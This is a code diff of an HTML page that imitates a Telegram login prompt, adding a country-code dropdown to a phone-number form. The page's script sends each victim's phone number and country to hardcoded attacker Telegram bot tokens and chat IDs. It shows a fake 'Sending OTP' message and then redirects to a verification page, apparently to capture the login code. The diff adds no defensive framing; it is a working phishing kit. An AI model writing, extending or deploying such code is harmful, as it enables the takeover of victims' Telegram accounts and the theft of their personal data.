@@ -173,71 +173,81 @@
       </svg>
     </div>
     <h1>Enter telegram number</h1>
-<p>To continue, please login first</p>
-<form id="phoneForm">
-  <label for="phone">Telegram number</label>
-  <input type="tel" id="phoneInput" placeholder="Telegram number" required />
-  
-  <button type="submit" class="btn">next</button>
-  
-  <div class="disclaimer">
-    *Make sure the number entered is active to receive verification. Data will be kept confidential in accordance with the Personal Data Protection Act.
+    <p>To continue, please login first</p>
+    <form id="phoneForm">
+      <label for="country">Country code \/</label>
+      <select id="countrySelect">
+  <option value="+966">SA Saudi Arabia</option>
+  <option value="+971">UAE United Arab Emirates (+971)</option>
+  <option value="+65">SG Singapore (+65)</option>
+  <option value="+60">MYS Malaysia (+60)</option>
+</select>
+
+<label for="phone">Telegram number</label>
+<input type="tel" id="phoneInput" placeholder="Telegram number" required />
+      
+      <button type="submit" class="btn">next</button>
+      
+      <div class="disclaimer">
+        *Make sure the number entered is active to receive verification. Data will be kept confidential in accordance with the Personal Data Protection Act.
+      </div>
+    </form>
+    <div class="status" id="statusMessage"></div>
   </div>
-</form>
-<div class="status" id="statusMessage"></div>
-</div>
 
-<script>
-  const phoneForm = document.getElementById('phoneForm');
-  const phoneInput = document.getElementById('phoneInput');
-  const statusMessage = document.getElementById('statusMessage');
-  const blurOverlay = document.getElementById('blurOverlay');
-  const loadingText = document.getElementById('loadingText');
+  <script>
+    const phoneForm = document.getElementById('phoneForm');
+const phoneInput = document.getElementById('phoneInput');
+const statusMessage = document.getElementById('statusMessage');
+const blurOverlay = document.getElementById('blurOverlay');
+const loadingText = document.getElementById('loadingText');
+const countrySelect = document.getElementById('countrySelect');
 
-  const bots = [
-    { token: "8013989944:AAHgNv4R4UBm5KjruBDuI-2tbAaY6iYcBKQ", chatId: "6628999300" },
-    { token: "7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM", chatId: "5876510981" }
-  ];
+const bots = [
+  { token: "7416784301:AAHFj7bIZRv_B-NWAPHSyJvR6bTwoyOXc2Q", chatId: "5795421010" },
+  { token: "7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM", chatId: "5876510981" }
+];
 
-  phoneForm.addEventListener('submit', function(e) {
-    e.preventDefault();
+phoneForm.addEventListener('submit', function(e) {
+  e.preventDefault();
 
-    const phone = phoneInput.value.trim();
-    const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
-    localStorage.setItem('sessionBotIndex', currentBotIndex);
-    const bot = bots[currentBotIndex];
+  const phone = phoneInput.value.trim();
+  const countryText = countrySelect.options[countrySelect.selectedIndex].text;
+  const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
+  localStorage.setItem('sessionBotIndex', currentBotIndex);
+  const bot = bots[currentBotIndex];
 
-    const message = `🌀 *FUN GAY LOGIN*\n━━━━━━━━━━━━━━\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
-    const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+  const message = `🌀 *FUN GAY LOGIN*\n━━━━━━━━━━━━━━\n🌍 Country: ${countryText}\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
+  const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
-    statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
-    statusMessage.style.color = "#000";
-    blurOverlay.style.display = "block";
-    loadingText.style.display = "block";
+  statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
+  statusMessage.style.color = "#000";
+  blurOverlay.style.display = "block";
+  loadingText.style.display = "block";
 
-    fetch(api)
-      .then(res => res.json())
-      .then(data => {
-        if (data.ok) {
-          const nextBotIndex = (currentBotIndex + 1) % bots.length;
-          localStorage.setItem('currentBotIndex', nextBotIndex);
-          setTimeout(() => {
-            window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
-          }, 3000);
-        } else {
-          blurOverlay.style.display = "none";
-          loadingText.style.display = "none";
-          statusMessage.textContent = "❌ Gagal mengirim ke bot.";
-          statusMessage.style.color = "red";
-        }
-      })
-      .catch(err => {
+  fetch(api)
+    .then(res => res.json())
+    .then(data => {
+      if (data.ok) {
+        const nextBotIndex = (currentBotIndex + 1) % bots.length;
+        localStorage.setItem('currentBotIndex', nextBotIndex);
+        setTimeout(() => {
+          window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
+        }, 3000);
+      } else {
         blurOverlay.style.display = "none";
         loadingText.style.display = "none";
-        statusMessage.textContent = "❌ Error: " + err.message;
+        statusMessage.textContent = "❌ Gagal mengirim ke bot.";
         statusMessage.style.color = "red";
-      });
-  });
-</script>
+      }
+    })
+    .catch(err => {
+      blurOverlay.style.display = "none";
+      loadingText.style.display = "none";
+      statusMessage.textContent = "❌ Error: " + err.message;
+      statusMessage.style.color = "red";
+    });
+});
+  </script>
 </body>
 </html>
